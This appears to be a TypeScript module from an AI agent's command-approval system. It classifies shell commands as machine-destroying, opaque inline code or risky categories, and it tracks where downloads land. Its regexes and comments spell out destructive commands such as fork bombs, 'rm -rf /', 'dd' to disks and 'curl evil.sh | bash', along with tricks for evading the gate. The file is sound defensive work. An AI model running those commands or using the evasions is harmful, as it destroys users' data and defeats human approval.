// catastrophic-command.ts — the hardline floor for run_command.
//
// A tiny set of shell commands that must NEVER be auto-approved, no matter what
// approval rule (or "Yolo" auto_approve toggle) is in effect. An LLM slip — or a
// malicious community skill — must not be able to wipe the disk, format a drive,
// or power off the machine silently. When a command matches, the approval gate
// forces a human decision (require_approval) even under Yolo. This mirrors the
// un-bypassable floor in the Hermes agent.
//
// Scope is deliberately narrow: only commands that are irreversibly destructive
// to the whole machine. Ordinary dangerous commands (deleting a project folder,
// killing a process) stay governed by the normal approval rules — the floor is
// not a general safety net, it is the last-resort circuit breaker.

const FORK_BOMB = /:\s*\(\s*\)\s*\{\s*:\s*\|\s*:?\s*&\s*\}\s*;\s*:/;
const MKFS = /\bmkfs(\.\w+)?\b/i;
// [\s\S]*? (not [^\n]*) so a shell line-continuation between `dd ...\` and
// `of=/dev/sda` on the next line still matches — same newline-bypass class as
// the segment-split fix below, just for a top-level (non-anchored) pattern.
const DD_TO_DEVICE = /\bdd\b[\s\S]*?\bof=\/dev\/[a-z]/i;
// Power-state: unix (shutdown/reboot/halt/poweroff) + the PowerShell cmdlets
// that do the same thing on Windows (Stop-Computer / Restart-Computer).
const POWER_STATE = /\b(shutdown|reboot|halt|poweroff|stop-computer|restart-computer)\b/i;
const INIT_RUNLEVEL = /\binit\s+[06]\b/;
const OVERWRITE_DEVICE = />\s*\/dev\/(sd[a-z]|nvme\d|disk\d|hd[a-z])/i;
// diskpart: Windows disk-partitioning tool. Legitimate automation almost never
// needs it (its main destructive use is wiping/repartitioning a disk), so the
// floor just forces a human OK rather than trying to parse its sub-commands.
const DISKPART = /\bdiskpart\b/i;
// PowerShell disk cmdlets whose entire purpose is destructive (format/wipe/
// repartition a physical disk). Unambiguous cmdlet names — no plausible
// unrelated command shares them — so a plain \b regex is safe here, no
// token-anchoring needed.
const DISK_CMDLET = /\b(format-volume|clear-disk|initialize-disk)\b/i;
// awk with an inline program that shells out — `awk 'BEGIN{system("rm -rf /")}'`,
// `awk '{print | "sh"}'`. awk's program is opaque code (like `python -c`), so an
// awk that calls system()/getline-pipe/print-pipe into a shell can do anything.
// Plain text-processing awk (no system/pipe) is untouched. (A'2, audit followup.)
const AWK_CODE_EXEC =
  /\bawk\b[\s\S]*?(\bsystem\s*\(|\bgetline\b[^;]*\||["'][^"']*\|\s*["']?\s*(?:sh|bash|cmd))/i;

/** Strip one leading and/or trailing quote char — tokens coming out of a
 * `"quoted string"` (e.g. `powershell -Command "format C:"`) keep a stray
 * quote glued on after a plain whitespace split. */
function stripQuotes(token: string): string {
  return token.replace(/^["']|["']$/g, '');
}

/**
 * Collapse repeated path separators (`//` → `/`, `\\` → `\`) before any
 * pattern below runs. Every device/root/wildcard-target regex in this file
 * is written for a SINGLE separator (`\/dev\/sda`, `^[a-z]:\\?\*?$`, …); a
 * doubled or tripled separator (`rm -rf //`, `of=//dev/sda`, `C:\\`) reaches
 * the exact same target once the shell runs it, but dodges those regexes
 * outright. Normalizing here — once, up front — means every check below
 * stays a simple single-separator pattern instead of each needing its own
 * `/+` variant.
 */
function normalizeSlashes(s: string): string {
  return s.replace(/\/{2,}/g, '/').replace(/\\{2,}/g, '\\');
}

// Interpreter/wrapper leaders that hand their remaining argument straight to
// a real shell — `cmd /c <cmd>`, `powershell -Command <cmd>`, `sudo <cmd>`,
// `sh -c <cmd>`, `bash -c <cmd>`. Recognizing exactly these (and only these)
// lets the command checks below "see through" the wrapper without falling
// back to a blanket "the command word can be ANY token in the segment" scan
// — that blanket version is what caused a real false positive: it also
// matched a destructive-looking word sitting inside a QUOTED, merely-printed
// argument to an unrelated command (`echo "rm -rf /" # just a comment`).
const WRAPPER_LEADER = new Set([
  'cmd',
  'cmd.exe',
  'powershell',
  'powershell.exe',
  'pwsh',
  'pwsh.exe',
  'sh',
  'bash',
  'sudo',
]);

/**
 * Strip zero or more leading interpreter-wrapper tokens (and, for each, the
 * single flag token that may follow it — `/c`, `-c`, `-Command`) so the
 * checks below can anchor on the FIRST token of what's left: the real
 * command being invoked. `cmd /c rm -rf /` → `["rm", "-rf", "/"]`; a plain
 * `echo "rm -rf /"` is untouched (`echo` isn't a recognized wrapper), so its
 * first token stays `echo` and no destructive check can match it.
 */
function stripWrapperPrefix(tokens: string[]): string[] {
  let i = 0;
  while (i < tokens.length && WRAPPER_LEADER.has((tokens[i] ?? '').toLowerCase())) {
    i += 1;
    if (i < tokens.length && /^[-/]/.test(tokens[i] ?? '')) {
      i += 1; // swallow the wrapper's own flag (/c, -c, -Command, …)
    }
  }
  return tokens.slice(i);
}

// Leaders that hand off to whatever comes after them UNCHANGED — they carry
// no language/interpreter of their own, so it's always safe to look past
// them at the real command word. Distinct from WRAPPER_LEADER: those either
// ARE an interpreter of interest (sh, bash, powershell) or fully consume a
// following flag; these are consumed themselves (plus their own flags / env
// assignments) purely to reach the token underneath (`sudo <cmd>`, `env
// FOO=bar <cmd>`, `cmd /c <cmd>`).
const PASSTHROUGH_LEADERS = new Set(['sudo', 'env', 'cmd', 'cmd.exe']);

/** Last path segment, lowercased, `.exe`/`.com` suffix dropped — so
 * `/usr/bin/python3`, `C:\Python311\python.exe`, and `"python3"` all reduce
 * to the same bare interpreter name as a plain `python3`. */
function interpreterBasename(token: string): string {
  const t = stripQuotes(token);
  const base = t.split(/[\\/]/).pop() ?? t;
  return base.replace(/\.(exe|com)$/i, '').toLowerCase();
}

/** Skip leading pass-through leaders (`sudo`, `env`, `cmd`/`cmd.exe`) — each
 * one's own env-var assignments and a single flag token — so the interpreter
 * check below sees the real interpreter even when wrapped once, e.g.
 * `cmd /c python -c "…"`, `sudo python3 -c "…"`, `env FOO=bar python3 -c "…"`. */
function skipPassthroughLeaders(tokens: string[]): string[] {
  let i = 0;
  while (i < tokens.length && PASSTHROUGH_LEADERS.has(interpreterBasename(tokens[i] ?? ''))) {
    i += 1;
    while (i < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[i] ?? '')) i += 1;
    if (i < tokens.length && /^[-/]/.test(tokens[i] ?? '')) i += 1;
  }
  return tokens.slice(i);
}

type InterpreterKind = 'python' | 'node' | 'perl' | 'ruby' | 'php' | 'shell' | 'powershell';

/** Classifies a bare interpreter name (already basename'd) into the kind of
 * inline-eval flag it accepts, or `null` if it isn't a recognized
 * general-purpose interpreter at all. */
function interpreterKind(name: string): InterpreterKind | null {
  if (name === 'py' || /^python[0-9.]*$/.test(name)) return 'python';
  if (/^node(js)?$/.test(name)) return 'node';
  if (/^perl[0-9.]*$/.test(name)) return 'perl';
  if (/^ruby[0-9.]*$/.test(name)) return 'ruby';
  if (/^php[0-9.]*$/.test(name)) return 'php';
  if (['sh', 'bash', 'zsh', 'ksh', 'dash', 'ash'].includes(name)) return 'shell';
  if (name === 'powershell' || name === 'pwsh') return 'powershell';
  return null;
}

/** True when `flag` (lowercased) is the inline-eval flag for `kind` — the
 * flag that hands the interpreter an opaque program as an ARGUMENT rather
 * than a script FILE (`-c`, `-e`, `-Command`, …). Deliberately narrow: `-m`,
 * `-File`, a bare script path, etc. run a named module/file, not arbitrary
 * inline text, so they're left to the normal (non-catastrophic) path. */
function isInlineEvalFlag(kind: InterpreterKind, flag: string): boolean {
  switch (kind) {
    case 'python':
      return flag === '-c';
    case 'node':
      return flag === '-e' || flag === '--eval' || flag === '-p' || flag === '--print';
    case 'perl':
    case 'ruby':
      return flag === '-e';
    case 'php':
      return flag === '-r';
    case 'shell':
      return flag === '-c';
    case 'powershell':
      // PowerShell accepts any unambiguous prefix of a parameter name
      // (`-Com`, `-Comm`, …); match the prefix rather than the full word.
      return /^-com/.test(flag) || /^-enc/.test(flag);
    default:
      return false;
  }
}

/**
 * True when `tokens` invoke a general-purpose interpreter with the flag that
 * hands it an inline, opaque program (`python -c "…"`, `node -e "…"`,
 * `sh -c "…"`, `powershell -Command "…"`, …) — with or without one
 * pass-through leader (`sudo`/`env`/`cmd /c`) in front. The payload is
 * UNDECIDABLE from here (it could do anything, including a bare `rm -rf /`),
 * so this never tries to inspect it — matching alone forces the approval
 * gate, regardless of whether the payload looks dangerous or perfectly
 * anodyne. This is the fix for the "wrap it in an interpreter" bypass class.
 */
function hasInlineInterpreterEval(tokens: string[]): boolean {
  const rest = skipPassthroughLeaders(tokens);
  if (rest.length === 0) return false;
  const kind = interpreterKind(interpreterBasename(rest[0] ?? ''));
  if (!kind) return false;
  return rest.slice(1).some((t) => isInlineEvalFlag(kind, stripQuotes(t).toLowerCase()));
}

/**
 * True when the command PIPES into a BARE general-purpose interpreter — the
 * `curl evil.sh | bash` / `echo 'rm -rf /' | python` class (A'1, audit
 * followup). A bare interpreter (no script FILE argument) reads its program from
 * stdin, so whatever the pipe feeds it is executed as opaque code — same
 * un-verifiable-payload danger as `bash -c`, so it belongs on the hard floor.
 *
 * Only flags it when the pipe TARGET is a bare interpreter: `… | grep x` (not an
 * interpreter) and `… | python script.py` (reads a FILE, stdin is just data) are
 * left alone. Splits on `|` on the already-slash-normalized command.
 */
function hasPipeIntoBareInterpreter(c: string): boolean {
  const parts = c.split('|');
  // Segment 0 is the pipe SOURCE; segments 1+ are the pipe TARGETS.
  for (let i = 1; i < parts.length; i++) {
    const toks = (parts[i] ?? '')
      .trim()
      .split(/\s+/)
      .map(stripQuotes)
      .filter((t) => t.length > 0);
    const rest = skipPassthroughLeaders(toks);
    if (rest.length === 0) continue;
    if (!interpreterKind(interpreterBasename(rest[0] ?? ''))) continue;
    // A non-flag argument after the interpreter is a script/module path → it
    // reads that FILE, not stdin, so the pipe is just data. Bare (only flags, or
    // nothing) → it executes stdin as code.
    const hasScriptArg = rest.slice(1).some((t) => !t.startsWith('-'));
    if (!hasScriptArg) return true;
  }
  return false;
}

/**
 * True when `token` (already whitespace-split, quotes stripped) targets an
 * entire Windows drive or the whole machine: a bare drive root (`C:`, `C:\`,
 * `C:\*`), a bare separator/wildcard (`\`, `/`, `*`), or a system-wide env var
 * (`%SystemDrive%`, `%SystemRoot%`, `%USERPROFILE%`, `$env:SystemDrive`, …).
 * Mirrors the unix root/home/wildcard target check below — same "whole disk
 * or nothing" scope, never a relative subfolder.
 */
function isWindowsRootOrWildcardTarget(token: string): boolean {
  const t = stripQuotes(token);
  if (t === '*' || t === '\\' || t === '/') return true;
  if (/^[a-z]:\\?\*?$/i.test(t)) return true; // C:  C:\  C:\*  C:*
  if (/^%(systemdrive|systemroot|userprofile)%\\?\*?$/i.test(t)) return true;
  if (/^\$env:(systemdrive|systemroot|userprofile)\\?\*?$/i.test(t)) return true;
  return false;
}

/**
 * True when `cmd` contains a catastrophic, machine-wide-destructive operation
 * that must always require explicit human approval (never auto-run).
 */
export function isCatastrophicCommand(cmd: string): boolean {
  if (typeof cmd !== 'string' || cmd.trim() === '') return false;
  // `shutdown --help` prints and exits (Reviewer A, #582 pass 2). Only the
  // long forms and `/?` here: `shutdown -h` HALTS the machine.
  const units = commandUnits(withoutRedirections(cmd));
  if (
    units.length > 0 &&
    units.every((u) => u.length >= 2 && u.slice(1).every((t) => FLOOR_READ_FLAGS.has(t)))
  ) {
    return false;
  }
  const c = normalizeSlashes(cmd.trim());

  if (
    FORK_BOMB.test(c) ||
    MKFS.test(c) ||
    DD_TO_DEVICE.test(c) ||
    POWER_STATE.test(c) ||
    INIT_RUNLEVEL.test(c) ||
    OVERWRITE_DEVICE.test(c) ||
    DISKPART.test(c) ||
    DISK_CMDLET.test(c)
  ) {
    return true;
  }

  // Segment-based checks below need each shell segment on its own, split on
  // ;, &, |, AND newline/CR — a bare newline is a statement separator in every
  // shell (sh, bash, cmd, PowerShell) just like `;`, and without splitting on
  // it `echo hi\nrm -rf / --no-preserve-root` would dodge the `^rm` anchor.
  for (const seg of c.split(/[;&|\n\r]+/)) {
    const s = seg.trim();
    if (!s) continue;

    // Tokens with stray quotes stripped — an interpreter wrapper like
    // `powershell -Command "format C:"` glues a quote onto the token next to
    // it after a plain whitespace split.
    const tokens = s.split(/\s+/).map(stripQuotes);

    // NOTE (ComfyUI regression, 2026-07): inline interpreter-eval (`python -c`,
    // `node -e`, `sh -c`, `… | python`, awk-code) is NO LONGER on the
    // catastrophic hard floor. It is opaque but not inherently machine-wide
    // destructive — and hard-refusing it (even after approval) broke the
    // ubiquitous `curl … | python -c "json.load(...)"` idiom, systematically
    // killing legitimate workflows. It is now classed as DESTRUCTIVE/heavy
    // (isInlineInterpreterEvalCommand → isDestructiveOrHeavyCommand): gated for a
    // human at propose_confirm/destructive_gate, auto-run under fully_autonomous
    // (the owner's explicit "run everything" trust), and — crucially —
    // APPROVABLE (it executes after a human OK). Only the deterministic
    // machine-destroyers above stay refused-even-after-approval.

    // The command actually being invoked, after peeling off a recognized
    // interpreter wrapper (see stripWrapperPrefix doc comment). Used to
    // ANCHOR the three command checks below on its first token — this is
    // what lets `cmd /c rm -rf /` be caught while `echo "rm -rf /"` (a mere
    // quoted mention, not an invocation) is not.
    const cmdTokens = stripWrapperPrefix(tokens);
    const cmdWord = cmdTokens[0] ?? '';

    // `rm` (unix, and PowerShell's `rm` alias for Remove-Item) recursive +
    // force against a machine-wide target — unix root/home/wildcard (/, /*,
    // ~, $HOME, bare *) OR a Windows drive root/wildcard/system env var
    // (`rm -r -Force C:\`, `rm -Recurse -Force C:\`, `cmd /c rm -rf /`). The
    // loose "-\S*r" / "-\S*f" match is deliberate: it must catch both a
    // bundled short flag (`-rf`) and a PowerShell long flag (`-Recurse`/
    // `-Force`) — both spellings contain the letter regardless of form.
    if (/^rm$/i.test(cmdWord)) {
      const recursive = /\s-\S*r/i.test(s) || /\s--recursive\b/i.test(s);
      const force = /\s-\S*f/i.test(s) || /\s--force\b/i.test(s);
      if (recursive && force) {
        if (/\s--no-preserve-root\b/i.test(s)) return true;
        // a root / home / wildcard target anywhere in the segment
        if (/(\s|=)(\/|\/\*|~|~\/\*?|\$HOME\/?\*?|\*)(\s|$|"|')/.test(s)) return true;
        if (tokens.some((t) => isWindowsRootOrWildcardTarget(t))) return true;
      }
    }

    // Windows `format <drive>:` — anchored on the (wrapper-unwrapped) command
    // word so `cmd /c format C:`, `powershell -Command "format C:"` are
    // caught while `clang-format`, `git format-patch`, `dotnet format`, and
    // the `Format-Table` cmdlet (where "format" is glued to other text, is a
    // different word, or isn't the invoked command) are left alone. A LATER
    // token must be a bare drive-letter target.
    if (
      /^format(\.(com|exe))?$/i.test(cmdWord) &&
      cmdTokens.slice(1).some((d) => /^[a-z]:([\\/]\*?)?$/i.test(d))
    ) {
      return true;
    }

    // Windows recursive+forced delete (Remove-Item/ri/del/erase/rd/rmdir)
    // against a machine-wide target — mirrors the `rm` check above, same
    // root-only scope AND the same wrapper-unwrapped command anchor (so
    // `cmd /c del /s /q C:` doesn't dodge it). `Remove-Item .\build -Recurse
    // -Force` (a relative project subfolder) must NOT match; only a drive
    // root / wildcard / system env var does.
    if (/^(ri|remove-item|del|erase|rd|rmdir)$/i.test(cmdWord)) {
      const psRecursiveForce = /(^|\s)-r(ecurse)?\b/i.test(s) && /(^|\s)-f(orce)?\b/i.test(s);
      const cmdRecursiveForce = /\/s\b/i.test(s) && /\/q\b/i.test(s);
      if (psRecursiveForce || cmdRecursiveForce) {
        if (tokens.some((t) => isWindowsRootOrWildcardTarget(t))) return true;
      }
    }
  }

  return false;
}

/**
 * True when `cmd` runs an OPAQUE interpreter program the classifier can't
 * inspect: an inline-eval flag (`python -c`, `node -e`, `sh -c`,
 * `powershell -Command`, …), a pipe into a bare interpreter (`… | python`,
 * `curl … | bash`), or awk executing code (`awk '…system…'`). With or without
 * one pass-through leader (`sudo`/`env`/`cmd /c`) in front.
 *
 * This class is NO LONGER catastrophic (ComfyUI regression fix, 2026-07): it is
 * treated as DESTRUCTIVE/heavy — gated for a human at propose_confirm/
 * destructive_gate, auto-run under fully_autonomous, and APPROVABLE (it runs
 * after a human OK, unlike the machine-destroyers). The runner also uses this
 * predicate to tailor its approval-card wording.
 */
export function isInlineInterpreterEvalCommand(cmd: string): boolean {
  if (typeof cmd !== 'string' || cmd.trim() === '') return false;
  const c = normalizeSlashes(cmd.trim());
  if (AWK_CODE_EXEC.test(c) || hasPipeIntoBareInterpreter(c)) return true;
  for (const seg of c.split(/[;&|\n\r]+/)) {
    const s = seg.trim();
    if (!s) continue;
    const tokens = s.split(/\s+/).map(stripQuotes);
    if (hasInlineInterpreterEval(tokens)) return true;
  }
  return false;
}

// ── Destructive / heavy actions (for the `destructive_gate` autonomy level) ──────
// BROADER than the catastrophic floor: actions that mutate the machine in a heavy
// or hard-to-undo way — file deletions, software installs / large downloads, disk
// ops, process/service control, recursive permission changes, destructive VCS.
// Under `destructive_gate`, ordinary work auto-approves but THESE still require a
// human OK. We deliberately err toward asking: a false "ask" is cheap, a silent
// 13 GB install (`comfy install`) or an `rm` is not.
/**
 * A program's global options, between its name and its subcommand: `git -C
 * dir`, `git -c k=v`, `git --no-pager`, `docker --context x`, `docker compose
 * -f file`. A pattern that only knew the short form (`git lfs pull`, `docker
 * pull`) let the real forms through unclassified (Reviewer A, #582).
 */
const GLOBAL_OPTIONS = String.raw`(?:\s+(?:--[\w-]+(?:=\S+|\s+[^-\s]\S*)?|-[A-Za-z](?:\s+[^-\s]\S*)?))*`;

/** `program [global options] subcommand…`, the form every such tool accepts. */
function subcommand(program: string, rest: string): RegExp {
  return new RegExp(String.raw`\b(?:${program})${GLOBAL_OPTIONS}\s+${rest}`, 'i');
}

/**
 * The same patterns, sorted by what a person would call them (#464). The
 * autonomy checklist lets an owner allow, ask or forbid each KIND of action;
 * their union below is still exactly what `destructive_gate` has always gated.
 */
export const STATIC_SHELL_CATEGORY_PATTERNS = {
  delete_files: [
    /\b(rm|rmdir|unlink|shred)\b/i, // delete (unix)
    /\bdel\s|\bRemove-Item\b|\brd\s+\/s/i, // delete (windows/ps)
    /\bfind\b[^\n]*-delete\b/i, // find … -delete
    // destructive VCS: work thrown away
    subcommand('git', String.raw`push\b[^\n]*(?:--force|-f\b)`),
    subcommand('git', String.raw`reset\s+--hard\b`),
    subcommand('git', String.raw`clean\s+-\S*f`),
    subcommand('git', String.raw`branch\s+-D\b`),
  ],
  install_software: [
    /\b(pip3?|npm|pnpm|yarn|apt|apt-get|yum|dnf|brew|pacman|choco|winget|uvx|pipx|cargo|gem|conda|comfy)\b[^\n]*\binstall\b/i, // pkg install
    /\b(npm|pnpm|yarn|bun)\s+(i|add|ci)\b|\bInstall-(Module|Package)\b/i, // npm i, pnpm add, PowerShell modules
    /\buv\s+(pip\s+install|add|tool\s+install)\b/i, // uv (review of PR #476)
    /\bgo\s+install\b/i, // go install
  ],
  // A command is filed by what it DOES (#581): fetching files (a model, an
  // archive, an image) is a download, whatever tool fetches it; installing
  // software is the kind above. `comfy model download` and `pip download` sat
  // in install_software, so an owner who let an agent fetch models without
  // asking had to let it install software.
  download: [
    // `iwr` is Invoke-WebRequest's alias (review of PR #476). `curl` is not
    // here: it downloads only when it writes a file (`-o`, `-O`, `--output`,
    // `-sLoC:\x`), read by `curlWritesAFile` with the same reader as its
    // targets, which a pattern cannot do (`-XPOST` swallows its group).
    /\bwget\b|\bInvoke-WebRequest\b|\biwr\b|\bStart-BitsTransfer\b|\baria2c\b/i, // large download
    subcommand('git', String.raw`clone\b`), // clone
    // `download` / `pull` must END the word: `comfy model download-status`,
    // `downloads` and `download-cancel` only read or stop one, and `\b` alone
    // let `download-status` match (run ca5753a8 asked the owner before every
    // progress check, #552).
    /\bcomfy\b[^\n]*\bmodel\s+download(?![\w-])|\bpip3?\b[^\n]*\bdownload(?![\w-])/i, // model / package files
    subcommand('hf|huggingface-cli', String.raw`download(?![\w-])`), // Hugging Face files
    subcommand('ollama', String.raw`pull(?![\w-])`), // models
    subcommand('git', String.raw`lfs\s+(?:pull|fetch)(?![\w-])`), // LFS objects
    // images: `docker pull`, `docker image pull`, `docker compose -f x pull`,
    // and the standalone compose binaries (`docker-compose pull`)
    subcommand(
      'docker-compose|podman-compose|docker|podman',
      String.raw`(?:(?:image|compose)${GLOBAL_OPTIONS}\s+)?pull(?![\w-])`,
    ),
  ],
  stop_programs: [
    /\b(kill|pkill|killall|taskkill)\b|\bStop-Process\b|\bStop-Service\b/i, // process kill
    /\bsystemctl\b|\bsc\s+(stop|delete)\b|\bservice\b[^\n]*\b(stop|restart)\b|\bnet\s+stop\b/i, // service control
  ],
  system_settings: [
    /\bmkfs(\.\w+)?\b|\bdd\b[^\n]*\bof=|\b(format|fdisk|parted|diskpart)\b/i, // disk ops
    /\b(chmod|chown|chgrp|takeown|icacls)\b|\bSet-Acl\b|\breg\s+(add|delete|import)\b/i, // permissions, ownership, registry
  ],
} as const satisfies Record<string, readonly RegExp[]>;

/**
 * The kinds of action read from a command's text: the patterns above, plus
 * inline code (`python -c "…"`), whose program is text nobody can read ahead.
 */
export type StaticShellCategory = keyof typeof STATIC_SHELL_CATEGORY_PATTERNS | 'inline_code';

const DESTRUCTIVE_PATTERNS: RegExp[] = Object.values(STATIC_SHELL_CATEGORY_PATTERNS).flat();

/**
 * The kinds of action a command performs, read from its text alone (#464).
 * Inline code (`python -c "…"`, `node -e "…"`) is its own kind: what it does is
 * not read, it is asked about, as `destructive_gate` always did.
 */
export function staticShellCategories(cmd: string): StaticShellCategory[] {
  if (typeof cmd !== 'string' || cmd.trim() === '') return [];
  // Read from the PROGRAMS the command runs, never from any word of its text
  // (review of PR #474, Reviewer A, P1): `git commit -m "rm old refs"` does not
  // delete, and `clang-format` is not `format`. A pattern counts only where it
  // matches at the start of a command the shell will run — each segment, and
  // the commands wrapped in `bash -c`, `cmd /c`, `powershell -Command`,
  // `xargs`, `find -exec` and `$(…)`. Hermes Agent anchors its patterns the
  // same way. Quotes and carets are removed by the tokenizer, so `r""m` and
  // `r^m` still read as `rm`.
  const found = new Set<StaticShellCategory>();
  for (const unit of commandUnits(withoutRedirections(cmd))) {
    for (const category of unitCategories(unit)) found.add(category);
  }
  // `curl URL > file` downloads without `-o`: the redirection is dropped by
  // the tokenizer, so it is read on the text of that segment. `curl --version
  // > log` is still a read.
  if (
    /(^|[;&|(]\s*)(curl|irm|Invoke-RestMethod)\b(?:[^;&|\n]|&(?=>))*>/i.test(cmd) &&
    !commandUnits(withoutRedirections(cmd))
      .filter((u) => /^(curl|irm|invoke-restmethod)$/i.test(u[0] ?? ''))
      .every(isVersionOrHelpOnly)
  ) {
    found.add('download');
  }
  if (isInlineInterpreterEvalCommand(cmd)) found.add('inline_code');
  return [...found];
}

/**
 * Where a download line writes, read from its text (#614, revue Nodal de la PR
 * #618, P1b). A download runs without asking because it lands in the agent's
 * workspace; `curl -o ~/.ssh/authorized_keys` or `git clone URL D:\elsewhere`
 * does not. The runner resolves these against the command's working folder
 * and the job's workspaces (packages/tools, shell-checklist.ts).
 *
 * - `dirs`: the folders the line moves into (`cd`, `pushd`, `Push-Location`,
 *   `Set-Location`), in order, `null` when unreadable (`cd` alone, `cd -`,
 *   `popd`, a variable).
 * - `targets`: each place a fetcher writes, as written (`'.'` for the working
 *   folder: `curl -O`, `wget URL`, `git clone URL`), or `null` when the text
 *   does not say where (a variable, `~`, a sub-shell): that asks, invariant #4.
 *   `after` is how many of `dirs` come before it in the line: the target is
 *   judged from the folder the line is in at that point (revue passe 2). A
 *   shell redirection (`> file`) is cut from the words before they are read,
 *   so its place in the line is not known: `after` is null, and it is judged
 *   from every folder of the line.
 *   A program that writes into its own store (`docker pull`, `ollama pull`,
 *   `comfy model download`, `hf download` without `--local-dir`) names no path
 *   and adds none.
 */
export interface DownloadTarget {
  path: string | null;
  after: number | null;
}

export interface DownloadWrites {
  dirs: Array<string | null>;
  targets: DownloadTarget[];
}

export function downloadWrites(cmd: string): DownloadWrites {
  const out: DownloadWrites = { dirs: [], targets: [] };
  if (typeof cmd !== 'string' || cmd.trim() === '') return out;
  const units = commandUnits(withoutRedirections(cmd));
  // `iwr URL | Set-Content file`: where the fetched bytes land, kept only if
  // the line downloads.
  const piped: DownloadTarget[] = [];
  let downloads = false;
  for (const unit of units) {
    const program = unit[0] ?? '';
    const args = unit.slice(1);
    if (CHANGE_DIR.has(program)) {
      const dir = changeDirArg(program, args);
      out.dirs.push(dir === null ? null : readablePath(dir));
      continue;
    }
    for (const t of pipeWriterTargets(program, args))
      if (!isNowhere(t)) piped.push({ path: readablePath(t), after: out.dirs.length });
    if (!unitCategories(unit).includes('download')) continue;
    downloads = true;
    for (const t of fetcherTargets(program, args))
      if (t === null || !isNowhere(t))
        out.targets.push({ path: t === null ? null : readablePath(t), after: out.dirs.length });
  }
  // `curl URL > file`: the bytes land where the shell sends them. Read on a
  // line that downloads (or reads a URL into a redirection, which
  // `staticShellCategories` files as a download).
  if (downloads || staticShellCategories(cmd).includes('download')) {
    out.targets.push(...piped);
    for (const t of redirectionTargets(cmd))
      if (!isNowhere(t)) out.targets.push({ path: readablePath(t), after: null });
  }
  return out;
}

const CHANGE_DIR = new Set([
  'cd',
  'chdir',
  'pushd',
  'popd',
  'set-location',
  'sl',
  'push-location',
  'pop-location',
]);

/**
 * The folder a `cd`-like unit moves into; null for home or back (`cd`, `cd ~`,
 * `cd -`, `popd`, `Pop-Location`): where that leads is not in this unit.
 */
function changeDirArg(program: string, args: readonly string[]): string | null {
  if (program === 'popd' || program === 'pop-location') return null;
  if (program === 'set-location' || program === 'sl' || program === 'push-location') {
    const i = args.findIndex((a) => /^-(literal)?path$/i.test(a));
    const value = i >= 0 ? args[i + 1] : args.find((a) => !a.startsWith('-'));
    return value ?? null;
  }
  // `cd /d D:\x` (cmd) takes a drive switch before the folder.
  const value = args.find((a) => !/^(-[LP]|\/d)$/i.test(a));
  if (value === undefined || value === '-') return null;
  return value;
}

/**
 * A device or a standard stream: what is written there lands in no place
 * (#669, approbation 0330a0fc du 02/10 : `curl -o /dev/null` lu comme un
 * fichier hors de l'espace interrogeait la personne). THE one rule every write
 * goes through (a fetcher's output, a pipe writer, a redirection): a device is
 * never judged against a workspace, and never named on a card.
 *
 * - POSIX and Git Bash: `/dev/null`, `/dev/zero`, `/dev/full`, `/dev/random`,
 *   `/dev/urandom`, `/dev/tty`, `/dev/stdin|stdout|stderr`, `/dev/fd/N`.
 *   Never `/dev/sda` or `/dev/tty1`: a disk or a console of the machine is a
 *   place.
 * - Windows: `NUL` and `CON` in any case, with a `:` (`nul:`) or an extension
 *   (`nul.json`, `NUL.tar.gz`: the device is what comes before the first dot),
 *   `CONIN$` / `CONOUT$`, and the same behind `\\.\`. The other reserved names
 *   (`PRN`, `AUX`, `COM1`, `LPT1`) reach hardware, which is a place to ask about.
 * - PowerShell: `$null`.
 *
 * Read the same on every OS: the text is judged, not the machine it runs on.
 * Only the bare name: `nul/a.json` or `/tmp/dev/null` are places. A tool's own
 * `-` for its standard output is read where the tool is (`curl -o -`,
 * `wget -O -`): for a shell redirection or `tee`, `-` is a file. What KIND of
 * action the line is does not change: only where it writes.
 */
function isNowhere(p: string): boolean {
  return POSIX_DEVICE.test(p) || WINDOWS_DEVICE.test(p) || POWERSHELL_NULL.test(p);
}

const POSIX_DEVICE = /^\/dev\/(?:null|zero|full|random|urandom|tty|stdin|stdout|stderr|fd\/\d+)$/;
const WINDOWS_DEVICE = /^(?:\\\\\.\\)?(?:(?:nul|con)(?::|\.[^\\/]*)?|conin\$|conout\$)$/i;
const POWERSHELL_NULL = /^\$null$/i;

/** A path as written, or null when the shell decides it at run time. */
function readablePath(p: string): string | null {
  if (p === '' || /[$%`]/.test(p) || p.startsWith('~')) return null;
  return p;
}

/** The value of a flag written `-f v`, `-fv` (short only), `--flag=v` or `-Flag:v`. */
function flagValues(
  args: readonly string[],
  matches: (flag: string) => boolean,
  attachedShort?: string,
): string[] {
  const values: string[] = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i] ?? '';
    const eq = a.match(/^(--?[\w-]+)[=:](.*)$/);
    if (eq && matches(eq[1] ?? '')) values.push(eq[2] ?? '');
    else if (matches(a)) values.push(args[i + 1] ?? '');
    else if (attachedShort && a.startsWith(attachedShort) && a.length > attachedShort.length)
      values.push(a.slice(attachedShort.length));
  }
  return values;
}

/**
 * The short options of a fetcher that take a value (from each program's
 * manual). In a group (`-sLo x`, `-sLox`, `-qO-`), options without a value
 * stack, and the first one that takes a value takes the rest of the group, or
 * the next word when the group ends with it: `-XPOST` is `-X POST`, not an
 * `-O` (#614, revue Nodal de la PR #618, passe 3).
 */
const SHORT_VALUE_OPTIONS: Record<'curl' | 'wget' | 'aria2c', string> = {
  curl: 'AbcCdDeEFHKmoPQrtTuUwxXyYz',
  wget: 'aABDeIilOoPQRtTUwX',
  aria2c: 'dijklmostUx',
};

/** Every short option of `args` as the program reads it, with its value ('' for a switch). */
function shortOptions(
  args: readonly string[],
  program: keyof typeof SHORT_VALUE_OPTIONS,
): Array<{ option: string; value: string }> {
  const takesValue = SHORT_VALUE_OPTIONS[program];
  const read: Array<{ option: string; value: string }> = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i] ?? '';
    if (!/^-[A-Za-z]/.test(a)) continue;
    for (let j = 1; j < a.length; j++) {
      const option = a[j] ?? '';
      if (!takesValue.includes(option)) {
        read.push({ option, value: '' });
        continue;
      }
      const rest = a.slice(j + 1);
      read.push({ option, value: rest !== '' ? rest : (args[++i] ?? '') });
      break;
    }
  }
  return read;
}

/** The values a program's short option `option` was given. */
function shortValues(
  args: readonly string[],
  program: keyof typeof SHORT_VALUE_OPTIONS,
  option: string,
): string[] {
  return shortOptions(args, program)
    .filter((o) => o.option === option)
    .map((o) => o.value);
}

function joinPath(dir: string, name: string): string {
  if (/^([A-Za-z]:)?[\\/]/.test(name)) return name;
  return dir === '.' ? name : `${dir.replace(/[\\/]$/, '')}/${name}`;
}

